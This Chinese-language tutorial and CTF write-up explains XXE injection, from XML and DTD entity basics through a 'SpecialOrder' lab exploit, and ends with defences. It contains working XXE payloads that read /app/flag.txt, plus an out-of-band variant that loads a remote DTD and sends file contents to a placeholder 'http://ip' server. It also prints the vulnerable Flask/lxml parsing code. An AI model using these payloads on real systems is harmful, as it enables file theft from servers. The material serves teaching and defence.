本文涉及知识点实操练习：[XXE漏洞分析与实践](https://www.hetianlab.com/expc.do?ec=ECIDcb00-c025-4fea-a3f4-93057c24bf78&pk_campaign=freebuf-wemedia)（通过该实验了解XXE漏洞的基础知识及演示实践。）

### 0x01.xxe漏洞

XXE漏洞全称XML External Entity
Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。

### 0x02.xml定义

XML由3个部分构成，它们分别是：文档类型定义(Document Type
Definition，DTD)，即XML的布局语言；可扩展的样式语言(Extensible Style
Language，XSL)，即XML的样式表语言；以及可扩展链接语言(Extensible Link Language，XLL)。

### 0x02.xml的作用

XML使用元素和属性来描述数 据。在数据传送过程中，XML始终保留了诸如父/子关系这样的数据结构。几个应用程序
可以共享和解析同一个XML文件，不必使用传统的字符串解析或拆解过程。

基本语法

所有 XML 元素都须有关闭标签。

XML 标签对大小写敏感。

XML 必须正确地嵌套。

XML 文档必须有根元素。

XML 的属性值须加引号。

实体引用(在标签属性，以及对应的位置值可能会出现<>符号，但是这些符号在对应的XML中都是有特殊含义的，这时候我们必须使用对应html的实体对应的表示，比如<傅好对应的实体就是&amplt，>符号对应的实体就是&ampgt)

XML中的注释，在XML中编写注释的语法与 HTML 的语法很相似。(<!-- -->)

在 XML 中，空格会被保留,多个空格不会被合并为一个。

示例如下：

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    
    <!-- ⬆XML声明⬆ -->
    
    <!DOCTYPE  文件名 [
    
    <!ENTITY实体名 "实体内容">
    
    ]>
    
    <!-- ⬆文档类型定义(DTD)⬆ -->
    
    <元素名称 category="属性">
    
    文本或其他元素
    
    </元素名称>
    
    <!-- ⬆文档元素⬆ -->
    

### 0x03.xml格式说明

XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素。

    
    
    <?xml version="1.0" encoding="utf-8" ?><!--xml声明-->
    
    <!DOCTYPE note [
            <!ELEMENT note (to,from,heading,body)>
            <!ELEMENT to (#PCDATA)>
            <!ELEMENT from (#PCDATA)>
            <!ELEMENT heading (#PCDATA)>
            <!ELEMENT body (#PCDATA)>
            ]><!--文档类型定义-->
    
    <note>
        <to>xxe</to>
        <from>ljpm</from>
        <heading>Text</heading>
        <body>Only test!</body>
    </note><!--文档元素-->
    

### 0x04.DTD

文档类型定义(DTD)可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例

#####  **1.外部DTD**

    
    
    <?xml version="1.0" encoding="utf-8" ?><!--xml声明-->
    
    <!DOCTYPE root-element SYSTEM "test.dtd">
    
    <note>
        <to>xxe</to>
        <from>ljpm</from>
        <heading>Text</heading>
        <body>Only test!</body>
    </note><!--文档元素-->
    

test.dtd

    
    
    <!ELEMENT to (#PCDATA)>
    <!ELEMENT from (#PCDATA)>
    <!ELEMENT heading (#PCDATA)>
    <!ELEMENT body (#PCDATA)>
    

### 0x05.DTD数据类型

> PCDATA的意思是被解析的字符数据/
>
> PCDATA的意思是被解析的字符数据，PCDATA是会被解析器解析的文本
>
> CDATA的意思是字符数据
>
> CDATA是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。

### 0x06.DTD实体介绍

#####  **1.内部实体**

    
    
    <?xml version="1.0" encoding="utf-8" ?><!--xml声明-->
    
    <!DOCTYPE note[
            <!ELEMENT note (name,pwd)>
            <!ENTITY name "admin">
            <!ENTITY pwd "admin">
            ]>
    
    <note>
        <name>&ampname</name>
        <pwd>&amppwd</pwd>
    </note><!--文档元素-->
    

结果如下：

![xml-1.png](https://image.3001.net/images/20210301/1614582447_603c92af441fcbd2ef90b.png!small)

#####  **2.外部实体**

    
    
    <?xml version="1.0" encoding="utf-8" ?><!--xml声明-->
    
    <!DOCTYPE note[
            <!ENTITY user SYSTEM "test.xml">
            ]>
    
    <note>&ampuser</note><!--文档元素-->
    

##### **3.参数实体+外部实体**

`test.xml`

    
    
    <?xml version="1.0" encoding="utf-8" ?><!--xml声明-->
    
    <!DOCTYPE note [
            <!ENTITY % user "admin">
            <!ENTITY % pwd "admin">
            <!ENTITY % ljpm SYSTEM "./dddd.dtd">
            %ljpm;
            ]>
    
    <note>&amppeople</note><!--文档元素-->
    

`dddd.dtd`

    
    
    <!ENTITY people "%user;%pwd;">
    

PS:`%name`(参数实体)是在DTD中被引用的，而`&ampname`是在xml文档中被引用的。XXE主要是利用了DTD引用外部实体导致的漏洞。

### 0x07.怎么判断网站是否存在XXE漏洞

最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞。

####  **0x08.示例如下：**

#####  **1.实验环境**

SpecialOrder

#####  **2.分析**

首页登录试验环境将会被重定向到一个登录界面：

![xml-2.png](https://image.3001.net/images/20210301/1614582449_603c92b1ef9b4530e9bb5.png!small)

环境有个注册选项，我们先注册一个用户，然后登录：

![xml-3.png](https://image.3001.net/images/20210301/1614582451_603c92b303c5dc87af6f5.png!small)

首页的右上角有几个路由，代表几个功能，我们可以一一尝试。在`http://192.168.153.128:5000/create-post`url下有一个类似于博客的提交框，可能存在存储性的xss

![xml-4.png](https://image.3001.net/images/20210301/1614582459_603c92bb2e1af0f10bcad.png!small)

尝试了一下，不存在xss

![xml-5.png](https://image.3001.net/images/20210301/1614582459_603c92bbe4c48b91b5047.png!small)

在`http://192.168.153.128:5000/customize`我们可以为上面我们创建的帖子添加样式：

![xml-6.png](https://image.3001.net/images/20210301/1614582460_603c92bc913816223d0fd.png!small)

添加样式后的结果如下：

![xml-7.png](https://image.3001.net/images/20210301/1614582461_603c92bd4d76948bc7910.png!small)

从上面的结果来看我们可以自定义帖子的css样式参数：

    
    
    * {
        font-size: 51px;
        color: red;
    }
    

至于上面的`51px;`为什么不是`50px;`我也不知道QAQ。这个环境就只有两个功能，上面那个发帖子的功能和这个修改样式的功能，发帖子功能大概没什么bug，唯有这个修改样式的比较可疑。我们可以通过burpsuite抓包分析一下。

![xml-8.png](https://image.3001.net/images/20210301/1614582462_603c92be425e7c6d1bd01.png!small)

发送的数据类型是`Content-Type: application/json`。我们将其改成`Content-Type:
application/xml`，看看接不接受xml。

![xml-9.png](https://image.3001.net/images/20210301/1614582463_603c92bf34206496f3747.png!small)

通过其返回没有报错，因此判断是支持xml的，刷新一下页面进一步验证：

![xml-10.png](https://image.3001.net/images/20210301/1614582464_603c92c00e6397ba0d06a.png!small)

现在我们尝试进行xml注入：

![xml-11.png](https://image.3001.net/images/20210301/1614582464_603c92c0c5637e71726e0.png!small)

结果如下：

![xml-12.png](https://image.3001.net/images/20210301/1614582465_603c92c1e3ae71efb9c48.png!small)

接下来就是读取`flag.txt`文件(环境没有添加`flag.txt`)，最后的payload：

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
            <!ENTITY file SYSTEM "file:///app/flag.txt">
            ]>
    <root>
        <color>&ampfile</color>
        <size>40px</size>
    </root>
    

### 0x09.Special Order pt2

0x41414141 CTF的一道题目该题是上一题的进化版(没有环境)，允许加载外部的`dtd`文件，因此payload如下：发送xml请求

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY % file SYSTEM "file:///flag.txt">
    <!ENTITY % xxe SYSTEM "http://ip/payload.dtd">
    %xxe;
    ]>
    <root>
        <color>&ampsend</color>
        <size>40px</size>
    </root>
    

在我们的服务器上

    
    
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://ip/?%file;'>"> %all;
    

0x08环境中代码有问题的部分

    
    
    elif request.content_type == "application/xml" or request.content_type == "text/xml":
                print(request.data)
                parser = etree.XMLParser()
                k = etree.fromstring(request.data, parser)
                post_color = ""
                post_size = ""
                w = ""
                for i in k.getchildren():
                    if i.tag == "color":
                        post_color = i.text
                    elif i.tag == "size":
                        post_size = i.text
                if db.session.query(settings_map).filter_by(username=session['username']).first():
                    db.session.query(settings_map).filter_by(username=session['username']).update({"size": post_size, "color": post_color})
                    db.session.commit()
                    return "DONE :D"
                else:
                    engine.execute(settings_table.insert(), username=session['username'], color=post_color, size=post_size)
                    return "DONE :D"
    

没有过滤造成的。

#### 0x0A.防御方法：

##### 禁用外部实体

##### 过滤和验证用户提交的XML数据

##### 不允许XML中含有任何自己声明的DTD

##### 有效的措施：配置`XML parser`只能使用静态DTD，禁止外来引入；对于Java来说，直接设置相应的属性值为false即可

